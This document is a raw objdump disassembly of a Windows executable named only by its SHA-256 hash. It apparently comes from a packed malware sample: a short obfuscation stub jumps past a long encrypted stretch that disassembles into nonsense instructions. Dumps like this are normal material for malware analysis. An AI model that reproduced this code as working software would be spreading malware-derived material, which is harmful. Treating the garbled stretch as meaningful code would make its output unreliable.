
c3cdfa4c1d2371fc90358233ff0a9a67b6adbe3047c2614e2da327c1ef9eb98c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x428441,0x4284e1
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428465,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x42834d
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428459,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x428421
  40104f:	xor    DWORD PTR ds:0x428565,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	and    BYTE PTR [ecx-0x41416f6e],cl
  40106f:	mov    esi,0xbec4bdbe
  401074:	mov    esi,0xc21cc88f
  401079:	push   ss
  40107a:	ds out 0x1f,al
  40107d:	(bad)  [eax+0x5be9ef0]
  401083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401084:	pop    ds
  401085:	(bad)  
  401086:	mov    edi,0x6e65c5dd
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    ?,WORD PTR [esp+eax*4-0x44]
  4010ad:	int    0xf4
  4010af:	cmp    esp,eax
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xfe52947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcr    bl,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	sub    edi,DWORD PTR [ebx-0x13b6c9c8]
  4010cc:	inc    edx
  4010cd:	lds    esp,FWORD PTR [edi]
  4010cf:	fisub  WORD PTR [eax+edi*4-0x3c13b6c5]
  4010d6:	jnp    0x40108a
  4010d8:	cmp    DWORD PTR [edi],ecx
  4010da:	jle    0x4010f5
  4010dc:	pop    ebp
  4010dd:	push   0x4c
  4010df:	call   0x4dd0:0x92a9d55b
  4010e6:	sbb    al,0x7d
  4010e8:	mov    dh,0xd
  4010ea:	in     eax,dx
  4010eb:	sbb    edx,esi
  4010ed:	shl    DWORD PTR [ebx+0x6f057026],1
  4010f3:	xor    dh,BYTE PTR [ebp+0x192828f1]
  4010f9:	inc    ecx
  4010fa:	jecxz  0x40115e
  4010fc:	mov    dl,0x5
  4010fe:	mov    eax,ds:0x7ec2a545
  401103:	mov    eax,0x13af2f9
  401108:	cmp    edi,DWORD PTR [esp+eax*2+0xa]
  40110c:	and    bh,al
  40110e:	test   DWORD PTR [eax],ecx
  401110:	push   edx
  401111:	adc    BYTE PTR [ecx+0x7f],0xa2
  401115:	and    ebx,0xf0386e52
  40111b:	sub    BYTE PTR [ebp-0x7c7e471e],dl
  401121:	mov    bl,0x53
  401123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401124:	mov    esp,0xbff994db
  401129:	push   0xffffffc6
  40112b:	es popf 
  40112d:	hlt    
  40112e:	loop   0x4011a3
  401130:	mov    dl,0x3a
  401132:	loope  0x40111b
  401134:	xor    DWORD PTR [ebx+0x6619203b],edx
  40113a:	and    eax,0x6562b37d
  40113f:	jle    0x40113c
  401141:	sub    eax,0xc5aa1b69
  401146:	mov    dl,0xc5
  401148:	and    ch,ah
  40114a:	dec    esi
  40114b:	sub    DWORD PTR [ecx+eiz*8+0x4f93155],edx
  401152:	dec    eax
  401153:	lock inc ebx
  401155:	mov    ebp,0x433aafac
  40115a:	push   cs
  40115b:	aad    0xbe
  40115d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40115e:	ret    0xf427
  401161:	mov    eax,DWORD PTR [edx]
  401163:	cmc    
  401164:	ficom  WORD PTR [edi]
  401166:	or     edx,ecx
  401168:	mov    esp,0x1e15fc13
  40116d:	mov    dl,0x18
  40116f:	popa   
  401170:	mov    esi,0xb192eadf
  401175:	mov    al,ds:0x9eaf639
  40117a:	add    DWORD PTR [ebx-0x5ace51f0],esi
  401180:	xchg   esi,eax
  401181:	xor    DWORD PTR [ebp+0x5f8f9f40],ebx
  401187:	stos   DWORD PTR es:[edi],eax
  401188:	and    BYTE PTR [ebx-0x666e6e50],0x3e
  40118f:	nop
  401190:	(bad)  
  401192:	mov    edx,DWORD PTR [esi]
  401194:	push   es
  401195:	mov    esi,0x2b91ae4e
  40119a:	je     0x4011e1
  40119c:	pop    ecx
  40119d:	adc    al,0xbd
  40119f:	std    
  4011a0:	popa   
  4011a1:	retf   
  4011a2:	repnz pop ss
  4011a4:	lods   eax,DWORD PTR ds:[esi]
  4011a5:	cld    
  4011a6:	shl    ch,0xed
  4011a9:	sub    DWORD PTR [eax+ecx*2+0x499ec585],0xf4952b32
  4011b4:	push   0x5abb5122
  4011b9:	pop    ss
  4011ba:	stos   BYTE PTR es:[edi],al
  4011bb:	fbstp  TBYTE PTR [esi+0x3e10513f]
  4011c1:	xor    eax,0x97e092a9
  4011c6:	mov    DWORD PTR [ecx+0x590987b6],ebx
  4011cc:	cmp    ebp,DWORD PTR [edx-0x28]
  4011cf:	cmp    edx,DWORD PTR [ebx]
  4011d1:	enter  0xfa41,0x51
  4011d5:	in     eax,0x77
  4011d7:	dec    ebp
  4011d8:	inc    esi
  4011d9:	xchg   edi,eax
  4011da:	in     al,dx
  4011db:	dec    edi
  4011dc:	mov    ebx,0x79e4eb1f
  4011e1:	shl    BYTE PTR [ebx],1
  4011e3:	scas   al,BYTE PTR es:[edi]
  4011e4:	jmp    FWORD PTR [ebp+0x18b702c]
  4011ea:	mov    WORD PTR [ebx+0x20],?
  4011ed:	ins    BYTE PTR es:[edi],dx
  4011ee:	pop    es
  4011ef:	ret    0xca10
  4011f2:	mov    bl,0x38
  4011f4:	fndisi(8087 only) 
  4011f6:	rcr    DWORD PTR [eax-0x55af366f],cl
  4011fc:	adc    DWORD PTR [esi+0x1d6fbada],esi
  401202:	mov    ebp,0xe7fb8fb1
  401207:	mov    eax,ds:0xc460902a
  40120c:	cmp    cl,BYTE PTR [eax]
  40120e:	(bad)  
  40120f:	mov    ebp,0xeb99dad5
  401214:	adc    al,0xc7
  401216:	iret   
  401217:	mov    ah,cl
  401219:	rol    BYTE PTR [esi],0xda
  40121c:	dec    edi
  40121d:	(bad)
  401220:	push   0x4df05f48
  401225:	loope  0x401207
  401227:	push   edx
  401228:	aam    0x9f
  40122a:	cld    
  40122b:	rcr    DWORD PTR [ecx-0x1eafec63],1
  401231:	adc    DWORD PTR [edx-0x7d],edi
  401234:	mov    ah,0x32
  401236:	mov    edi,0x585220f9
  40123b:	mov    eax,ds:0x9d8d91d5
  401240:	mov    dl,0x59
  401242:	pushf  
  401243:	fistp  QWORD PTR [ebx]
  401245:	je     0x40124f
  401247:	add    ebx,DWORD PTR [esi-0x3fb6cd1a]
  40124d:	mov    ds:0x883b7e6b,al
  401252:	outs   dx,BYTE PTR ds:[esi]
  401253:	loop   0x401289
  401255:	xchg   dh,dh
  401257:	ja     0x401269
  401259:	push   eax
  40125a:	aad    0xa9
  40125c:	sti    
  40125d:	or     DWORD PTR [ebp-0x9807773],0xffffffbc
  401264:	pop    es
  401265:	jecxz  0x40128f
  401267:	jmp    0xf7f4:0xd3d11203
  40126e:	adc    eax,0x7b07d87b
  401273:	jp     0x4012d8
  401275:	enter  0x418f,0xa7
  401279:	mov    DWORD PTR [edi+0x2f38e957],eax
  40127f:	inc    edx
  401280:	sub    dl,0x3a
  401283:	adc    edx,DWORD PTR ds:[ebp-0x2e]
  401287:	mov    DWORD PTR [edi],eax
  401289:	mov    ecx,0xec64e9ae
  40128e:	pop    edx
  40128f:	dec    eax
  401290:	push   ds
  401291:	sub    DWORD PTR [eax-0x24],ebp
  401294:	pop    eax
  401295:	sub    BYTE PTR [edi],dl
  401297:	pop    ebp
  401298:	sbb    DWORD PTR [edx],ecx
  40129a:	or     ecx,DWORD PTR [ecx]
  40129c:	data16 adc BYTE PTR [esi+ebp*4+0x795c0e19],ah
  4012a4:	scas   eax,DWORD PTR es:[edi]
  4012a5:	aaa    
  4012a6:	(bad)  
  4012a7:	(bad)  
  4012a8:	push   cs
  4012a9:	ins    DWORD PTR es:[edi],dx
  4012aa:	pushf  
  4012ab:	mov    bl,0x3d
  4012ad:	retf   0xf926
  4012b0:	gs aam 0x7c
  4012b3:	push   ebp
  4012b4:	push   edx
  4012b5:	pop    es
  4012b6:	daa    
  4012b7:	xchg   si,ax
  4012b9:	adc    DWORD PTR [edx-0x37],esp
  4012bc:	je     0x401274
  4012be:	stos   DWORD PTR es:[edi],eax
  4012bf:	cs dec ecx
  4012c1:	add    eax,0x4c834924
  4012c6:	mov    ecx,es
  4012c8:	and    BYTE PTR [edx+0x1d5a15c3],0x8a
  4012cf:	jae    0x401296
  4012d1:	dec    eax
  4012d2:	loopne 0x401291
  4012d4:	out    dx,al
  4012d5:	pop    ds
  4012d6:	cmc    
  4012d7:	jg     0x4012da
  4012d9:	ss ins BYTE PTR es:[edi],dx
  4012db:	inc    DWORD PTR [eax+0x33]
  4012de:	push   edx
  4012df:	cmc    
  4012e0:	dec    edi
  4012e1:	outs   dx,BYTE PTR ds:[esi]
  4012e2:	pop    edi
  4012e3:	add    eax,0x94017271
  4012e8:	and    BYTE PTR [edi+0x41],dl
  4012eb:	xchg   edi,eax
  4012ec:	mul    BYTE PTR [ecx+0x72ef432e]
  4012f2:	rol    BYTE PTR ds:0xd009f711,0xfb
  4012f9:	or     BYTE PTR [ebp+ecx*2-0x3961ee78],ch
  401300:	xchg   esi,eax
  401301:	lahf   
  401302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401303:	jmp    0xefa3bc0a
  401308:	gs aaa 
  40130a:	icebp  
  40130b:	jle    0x401386
  40130d:	(bad)  
  40130e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40130f:	inc    esp
  401310:	test   al,0x8
  401312:	push   edi
  401313:	addr16 mov esp,0x921756c5
  401319:	xor    DWORD PTR [ebp+0x63e86e47],edx
  40131f:	test   al,0x94
  401321:	adc    ecx,DWORD PTR [ebp+0x79]
  401324:	ds enter 0x3e5e,0x57
  401329:	mov    bh,0xf8
  40132b:	repz sbb al,0x49
  40132e:	mov    BYTE PTR [edi-0x862b2b4],cl
  401334:	mov    dl,0x78
  401336:	push   ebp
  401337:	push   ecx
  401338:	stos   BYTE PTR es:[edi],al
  401339:	popa   
  40133a:	retf   
  40133b:	cmp    dh,BYTE PTR [edi+0x5cea2d7a]
  401341:	lea    ecx,[esi-0x62778a12]
  401347:	pushf  
  401348:	add    ch,BYTE PTR [edx+0x1638bbbe]
  40134e:	retf   0x5403
  401351:	adc    DWORD PTR [ecx-0x167b036c],0xffffffae
  401358:	sbb    al,0x91
  40135a:	sar    BYTE PTR [eax],0x15
  40135d:	(bad)  
  40135e:	xor    eax,0xb3e745e4
  401363:	add    al,0xb8
  401365:	outs   dx,DWORD PTR ds:[esi]
  401366:	lds    ebx,FWORD PTR [bx+si]
  401369:	ins    BYTE PTR es:[edi],dx
  40136a:	(bad)  
  40136b:	int    0x73
  40136d:	adc    eax,0x7ac19eaa
  401372:	sub    ecx,DWORD PTR [esi+0x6c]
  401375:	pop    ss
  401376:	jmp    0x4013d7
  401378:	pop    ebp
  401379:	mov    DWORD PTR [eax+0x166354ea],ebp
  40137f:	fidivr WORD PTR [edi+0x75]
  401382:	loopne 0x4013ef
  401384:	in     al,dx
  401385:	mov    dh,0xd8
  401387:	cmp    eax,0x545406d
  40138c:	or     dl,BYTE PTR [ebp+0x74]
  40138f:	jo     0x40134e
  401391:	mov    ecx,?
  401393:	(bad)  
  401394:	pop    esi
  401395:	and    dh,BYTE PTR [eax-0x3c5ba96c]
  40139b:	ins    DWORD PTR es:[edi],dx
  40139c:	pop    ebp
  40139d:	sbb    eax,0xea7da96e
  4013a2:	les    edx,FWORD PTR [edi]
  4013a4:	and    eax,0xe21ad9e8
  4013a9:	pop    ebp
  4013aa:	cmc    
  4013ab:	test   al,0x58
  4013ad:	fs sbb al,0xa3
  4013b0:	out    dx,al
  4013b1:	xor    al,0x72
  4013b3:	xor    eax,0xd666957d
  4013b8:	add    BYTE PTR [eax],0x49
  4013bb:	xor    BYTE PTR [esp+ebp*4-0x2b341a13],bl
  4013c2:	loopne 0x401399
  4013c4:	jl     0x4013f2
  4013c6:	fild   QWORD PTR [esi-0x62ae7b0e]
  4013cc:	pop    ebx
  4013cd:	aaa    
  4013ce:	pop    esp
  4013cf:	call   0x5efa4828
  4013d4:	ins    BYTE PTR es:[edi],dx
  4013d5:	aad    0x31
  4013d7:	jae    0x4013d9
  4013d9:	addr16 sbb ebp,ecx
  4013dc:	pop    eax
  4013dd:	shr    dl,0x32
  4013e0:	add    DWORD PTR [edx],eax
  4013e2:	aad    0xf7
  4013e4:	pop    es
  4013e5:	faddp  st(0),st
  4013e7:	or     al,0xeb
  4013e9:	loope  0x401463
  4013eb:	or     cl,al
  4013ed:	mov    ch,al
  4013ef:	jg     0x40137f
  4013f1:	adc    eax,0x6001e630
  4013f6:	loope  0x401468
  4013f8:	mov    esp,0x3ac4d8b
  4013fd:	cmp    eax,0x4284c1
  401402:	mov    edx,DWORD PTR [ebp-0x58]
  401405:	sbb    DWORD PTR ds:0x4284d9,ecx
  40140b:	mov    edi,DWORD PTR [ebp-0x54]
  40140e:	sub    DWORD PTR ds:0x428565,0x1812
  401418:	sub    eax,edx
  40141a:	movzx  edx,BYTE PTR ds:0x428451
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x1c679415],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x24409ebe]
  401441:	xchg   edx,eax
  401442:	loope  0x4014ac
  401444:	mov    ebp,0xf8a292ce
  401449:	jmp    0x401495
  40144b:	add    DWORD PTR [eax],ebx
  40144d:	iret   
  40144e:	pop    ss
  40144f:	inc    eax
  401450:	cmp    eax,0x17190a27
  401455:	scas   eax,DWORD PTR es:[edi]
  401456:	dec    ebx
  401457:	aas    
  401458:	call   0x1b72:0xeeefdc5b
  40145f:	push   esi
  401460:	mov    edi,0x937f5623
  401465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401466:	pusha  
  401467:	xor    BYTE PTR [ebx+0x7e],cl
  40146a:	test   eax,0x85189b0d
  40146f:	mov    DWORD PTR [eax],edi
  401471:	rcr    BYTE PTR ds:0x7df5dbcb,cl
  401477:	add    cl,BYTE PTR [edi+0x3e]
  40147a:	pop    es
  40147b:	or     esi,DWORD PTR [eax]
  40147d:	or     ebx,DWORD PTR [eax]
  40147f:	jns    0x4014af
  401481:	fld    DWORD PTR [ecx-0x327dfb8d]
  401487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401488:	adc    dl,ah
  40148a:	je     0x67883642
  401490:	add    DWORD PTR [eax],edi
  401492:	xor    DWORD PTR [ebx-0x41],ebx
  401495:	retf   0x66ef
  401498:	fldenv [ecx+0x5b]
  40149b:	mov    esi,0x94fed97d
  4014a0:	lods   eax,DWORD PTR ds:[esi]
  4014a1:	fiadd  DWORD PTR [esi]
  4014a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014a4:	xor    bl,bh
  4014a6:	aas    
  4014a7:	hlt    
  4014a8:	and    al,0x21
  4014aa:	in     al,dx
  4014ab:	out    dx,eax
  4014ac:	div    esi
  4014ae:	sub    eax,0x2ea5c341
  4014b3:	mov    ebx,0x7ba8a4df
  4014b8:	mov    edi,0xb6d71038
  4014bd:	mov    eax,0x417709ab
  4014c2:	mov    ch,BYTE PTR [edi]
  4014c4:	adc    DWORD PTR [eax+0x26],ecx
  4014c7:	push   ss
  4014c8:	aam    0x68
  4014ca:	repz sbb DWORD PTR [ebx+0x42ca23b1],esi
  4014d1:	imul   eax,eax,0x1ed4baad
  4014d7:	push   edi
  4014d8:	loop   0x401536
  4014da:	mov    eax,ds:0x7a4bb8b2
  4014df:	test   BYTE PTR [esi+0x49],ch
  4014e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014e3:	xchg   ebp,eax
  4014e4:	dec    edx
  4014e5:	sub    ebx,DWORD PTR [edi-0x5d211a]
  4014eb:	mov    eax,ds:0xc61a6e12
  4014f0:	enter  0x3614,0xca
  4014f4:	jnp    0x4014d1
  4014f6:	sbb    cl,BYTE PTR [eax+0x7c]
  4014f9:	xchg   esp,ebx
  4014fb:	pop    ecx
  4014fc:	add    DWORD PTR [edx+0x21],esp
  4014ff:	(bad)  
  401500:	out    dx,eax
  401501:	dec    eax
  401502:	xchg   ecx,eax
  401503:	mov    ds:0x395c2db7,al
  401508:	ins    BYTE PTR es:[edi],dx
  401509:	push   edx
  40150a:	iret   
  40150b:	psubb  mm7,QWORD PTR [esi*8+0x1e32ac6c]
  401513:	lods   al,BYTE PTR ds:[esi]
  401514:	and    DWORD PTR ds:0xf277da2d,0xffffffb8
  40151b:	fdivr  QWORD PTR [eax-0x5f66b4c8]
  401521:	pushf  
  401522:	sbb    ch,bl
  401524:	jg     0x401564
  401526:	ret    
  401527:	adc    DWORD PTR gs:[edi-0x11a0f29a],esp
  40152e:	adc    al,0xc8
  401530:	(bad)  
  401531:	jmp    0x401563
  401533:	mov    BYTE PTR [ebp-0x2f],al
  401536:	push   edx
  401537:	outs   dx,BYTE PTR ds:[esi]
  401538:	(bad)  
  401539:	push   esp
  40153a:	inc    ecx
  40153b:	push   esp
  40153c:	sub    al,0xfb
  40153e:	and    DWORD PTR [ecx-0x62f7075b],ebp
  401544:	mov    ss,WORD PTR [ebp-0x67]
  401547:	(bad)  
  401548:	mov    edx,0x9b3cbc86
  40154d:	mov    BYTE PTR ds:0x218581a4,ah
  401553:	xor    al,0x68
  401555:	ror    DWORD PTR [ecx+eax*2],1
  401558:	stos   BYTE PTR es:[edi],al
  401559:	popa   
  40155a:	fsub   QWORD PTR [ecx-0x16e82d24]
  401560:	jmp    0xc3d6:0x737d2ce7
  401567:	push   esp
  401568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401569:	add    DWORD PTR [ebx],ebp
  40156b:	popa   
  40156c:	jp     0x40154d
  40156e:	push   DWORD PTR [ecx]
  401570:	pop    ecx
  401571:	pop    edx
  401572:	retf   
  401573:	ja     0x401501
  401575:	mov    ecx,0xa0e0bdfe
  40157a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40157b:	ror    BYTE PTR [edi],1
  40157d:	retf   
  40157e:	(bad)  
  40157f:	sub    al,0xec
  401581:	loopne 0x401535
  401583:	addr16 pushf 
  401585:	mov    ds,edx
  401587:	popf   
  401588:	retf   
  401589:	jbe    0x401562
  40158b:	test   al,0x22
  40158d:	clc    
  40158e:	sub    eax,0x5184df91
  401593:	mov    edx,0xb9d8da0
  401598:	adc    BYTE PTR [edx],dh
  40159a:	inc    esp
  40159b:	clc    
  40159c:	imul   edx,DWORD PTR ds:0x38c453fd,0xffffff8d
  4015a3:	pushf  
  4015a4:	add    eax,0x9f1efe5
  4015a9:	xor    DWORD PTR [ecx-0x64],edi
  4015ac:	jnp    0x4015ce
  4015ae:	test   DWORD PTR [ebx],esp
  4015b0:	mov    ebx,0x9eb7ddd4
  4015b5:	int3   
  4015b6:	rcr    BYTE PTR [ecx],0xe
  4015b9:	leave  
  4015ba:	gs (bad) 
  4015bd:	jb     0x401605
  4015bf:	dec    esp
  4015c0:	cwde   
  4015c1:	lahf   
  4015c2:	test   eax,0xc6011c0
  4015c7:	repz lahf 
  4015c9:	cmp    ebp,edx
  4015cb:	(bad)  [eax-0x64]
  4015ce:	shl    DWORD PTR ds:0x689919e2,1
  4015d4:	xor    eax,DWORD PTR [ecx-0x42]
  4015d7:	and    DWORD PTR [eax],ecx
  4015d9:	mov    ah,0x55
  4015db:	inc    ecx
  4015dc:	mov    dh,0xd6
  4015de:	jle    0x401570
  4015e0:	mov    eax,ds:0x7ae7236c
  4015e5:	pusha  
  4015e6:	(bad)  
  4015e7:	dec    ebx
  4015e8:	xchg   edi,eax
  4015e9:	jnp    0x401616
  4015eb:	xor    BYTE PTR [ebx-0x43],bl
  4015ee:	dec    esp
  4015ef:	mov    dh,0xec
  4015f1:	or     al,0x96
  4015f3:	and    eax,0xdcc11368
  4015f8:	mov    al,ds:0xed48ba66
  4015fd:	lods   al,BYTE PTR ds:[esi]
  4015fe:	add    BYTE PTR [esi],bl
  401600:	repz jmp 0xf8d9:0x9b1d1f18
  401608:	inc    edx
  401609:	pop    edi
  40160a:	sbb    esp,DWORD PTR [edx+0x7d]
  40160d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40160e:	in     al,0xb9
  401610:	lds    esi,FWORD PTR ds:0xff639f4f
  401616:	jecxz  0x40168a
  401618:	xchg   DWORD PTR [ecx+0x5],edx
  40161b:	lahf   
  40161c:	pushf  
  40161d:	xor    DWORD PTR [esi],0x137fe260
  401623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401624:	sbb    al,dh
  401626:	(bad)  
  401627:	fld    QWORD PTR [eax]
  401629:	shl    BYTE PTR [ebx+0x21],cl
  40162c:	xlat   BYTE PTR ds:[ebx]
  40162d:	xchg   DWORD PTR [bx+0x233b],ebp
  401632:	sub    esp,DWORD PTR [eax]
  401634:	push   esi
  401635:	call   0x8ecf:0x3ec2ab9f
  40163c:	push   ss
  40163d:	out    dx,al
  40163e:	mov    ch,0x9a
  401640:	ret    
  401641:	(bad)  
  401643:	add    eax,0xc0c86450
  401648:	and    ah,dl
  40164a:	dec    esp
  40164b:	aad    0xea
  40164d:	push   ss
  40164e:	xchg   DWORD PTR [edi],ecx
  401650:	ja     0x4015e0
  401652:	sub    DWORD PTR [edi],esi
  401654:	xchg   ebp,eax
  401656:	pop    edx
  401657:	clc    
  401658:	adc    BYTE PTR [eax+0x5f],ch
  40165b:	stos   BYTE PTR es:[edi],al
  40165c:	push   ds
  40165d:	inc    esp
  40165e:	pop    es
  40165f:	push   fs
  401661:	pop    ecx
  401662:	outs   dx,BYTE PTR ds:[esi]
  401663:	mov    ah,0x49
  401665:	inc    eax
  401666:	sbb    al,0x60
  401668:	add    eax,0x5751ac46
  40166d:	push   eax
  40166e:	fidivr WORD PTR [edi+0x2cd64ea8]
  401674:	out    dx,eax
  401675:	dec    esp
  401676:	(bad)  
  401677:	fidiv  WORD PTR [eax-0x79]
  40167a:	out    dx,eax
  40167b:	scas   al,BYTE PTR es:[edi]
  40167c:	pop    ds
  40167d:	out    0x0,al
  40167f:	mov    eax,0xc525aa60
  401684:	retf   
  401685:	ret    0x49ef
  401688:	xlat   BYTE PTR ds:[ebx]
  401689:	xor    eax,0xb9cb50b8
  40168e:	lods   al,BYTE PTR ds:[esi]
  40168f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401690:	or     DWORD PTR [eax-0x71],edx
  401693:	ret    0x30d1
  401696:	popa   
  401697:	ss add edx,eax
  40169a:	pop    edi
  40169b:	in     eax,0x8f
  40169d:	dec    esp
  40169e:	mov    eax,ds:0xec3186b3
  4016a3:	test   eax,0xf90914e3
  4016a8:	sbb    al,0x39
  4016aa:	sbb    eax,0x22f9a4b8
  4016af:	test   DWORD PTR [esi-0x7e21e857],edx
  4016b5:	call   0x668d:0x69b58bfa
  4016bc:	addr16 test al,0x36
  4016bf:	or     dl,al
  4016c1:	pop    edi
  4016c2:	ja     0x4016d9
  4016c4:	fadd   QWORD PTR [eax]
  4016c6:	out    dx,al
  4016c7:	or     edx,DWORD PTR [ebx+0x54]
  4016ca:	push   esp
  4016cb:	test   esp,ebp
  4016cd:	clc    
  4016ce:	inc    esp
  4016cf:	mov    ecx,0x9f4a8cc5
  4016d4:	shl    esi,cl
  4016d6:	fstp   QWORD PTR [esi]
  4016d8:	dec    ebx
  4016d9:	pop    ds
  4016da:	adc    al,0x46
  4016dc:	dec    esi
  4016de:	dec    esp
  4016df:	mov    ch,0xaa
  4016e1:	dec    ebx
  4016e2:	xor    BYTE PTR [edi+esi*2+0x16],0x54
  4016e7:	xchg   edx,eax
  4016e8:	ja     0x4016af
  4016ea:	mov    ah,0xd8
  4016ec:	ror    BYTE PTR [edi+0x13b869a2],1
  4016f2:	or     BYTE PTR ds:0x207e7297,bl
  4016f8:	mov    ebx,0x7312edfd
  4016fd:	sub    al,0xb5
  4016ff:	loopne 0x401772
  401701:	mov    eax,ds:0x121201a8
  401706:	cli    
  401707:	and    dh,BYTE PTR [edi+0x15]
  40170a:	cwde   
  40170b:	dec    esi
  40170c:	push   es
  40170d:	lods   eax,DWORD PTR ds:[esi]
  40170e:	inc    esp
  40170f:	mov    dh,0xc
  401711:	(bad)  ds:0x43f9ad87
  401717:	(bad)  
  401718:	lods   al,BYTE PTR ds:[esi]
  401719:	jp     0x4016aa
  40171b:	jp     0x4016f0
  40171d:	xchg   DWORD PTR fs:[edi],eax
  401720:	imul   edi,ebx,0x724e2728
  401726:	data16 js 0x4016b3
  401729:	jne    0x4016e6
  40172b:	mov    bh,0xef
  40172d:	fsubr  DWORD PTR [ebp+0x56]
  401730:	jns    0x4016b5
  401732:	dec    eax
  401733:	jge    0x401749
  401735:	xchg   edx,eax
  401736:	jb     0x401790
  401738:	test   eax,0xe79cc005
  40173d:	loopne 0x4017b8
  40173f:	std    
  401740:	mov    ds:0x56aa4e8c,al
  401745:	sbb    edx,esp
  401747:	jnp    0x401735
  401749:	test   al,0x1e
  40174b:	cmp    al,0x2f
  40174d:	and    esp,DWORD PTR [ebp-0x6803a407]
  401753:	pop    edx
  401754:	sub    eax,0xf825645a
  401759:	or     BYTE PTR [ecx],0x2c
  40175c:	xchg   ecx,eax
  40175d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175e:	inc    ebp
  40175f:	loop   0x40179f
  401761:	pop    esp
  401762:	cmp    ah,ch
  401764:	fld    DWORD PTR [ecx+ebp*2-0x44]
  401768:	in     al,dx
  401769:	jb     0x40178c
  40176b:	dec    ebx
  40176c:	lods   al,BYTE PTR ds:[esi]
  40176d:	out    0x1a,al
  40176f:	leave  
  401770:	(bad)  
  401774:	or     eax,0xa0797ad1
  401779:	push   esi
  40177a:	mov    cl,0x8e
  40177c:	cmp    edx,0xfffffff6
  40177f:	mov    ch,0xf4
  401781:	arpl   WORD PTR [ebx],si
  401783:	jnp    0x4017fd
  401785:	fisttp WORD PTR [edi]
  401787:	push   edx
  401788:	cmp    edx,esi
  40178a:	aaa    
  40178b:	cmp    eax,0x39683f83
  401790:	cmp    al,0x28
  401792:	jbe    0x4017c6
  401794:	js     0x401798
  401796:	mov    ebx,0x77ff79a8
  40179b:	out    0xa9,eax
  40179d:	fisttp QWORD PTR [edx-0x719b0529]
  4017a3:	and    dl,BYTE PTR [edx-0x10]
  4017a6:	lds    edi,FWORD PTR [edi+0x122344f7]
  4017ac:	push   es
  4017ad:	(bad)  
  4017af:	les    edi,FWORD PTR [edx]
  4017b1:	in     al,dx
  4017b2:	pusha  
  4017b3:	push   0x28
  4017b5:	cmp    DWORD PTR [edx-0x46e92ffb],eax
  4017bb:	inc    ebx
  4017bc:	sub    eax,0xf8c02d30
  4017c1:	adc    cl,BYTE PTR [ecx-0x30e457bb]
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x428441,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x428439,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428555
  4017f4:	movzx  ecx,WORD PTR ds:0x428349
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x428439,0x0
  401811:	ja     0x401846
  401817:	push   0x428285
  40181c:	call   DWORD PTR ds:0x42e09c
  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x428345
  40182a:	xor    DWORD PTR ds:0x4284b5,edx
  401830:	mov    edi,DWORD PTR ds:0x428425
  401836:	or     DWORD PTR ds:0x4284bd,edi
  40183c:	or     DWORD PTR ds:0x428335,0x7336
  401846:	sbb    DWORD PTR ds:0x428439,0x42f3
  401850:	mov    DWORD PTR ds:0x428569,0x382b
  40185a:	inc    DWORD PTR ds:0x428571
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x422570
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428455,0xc55
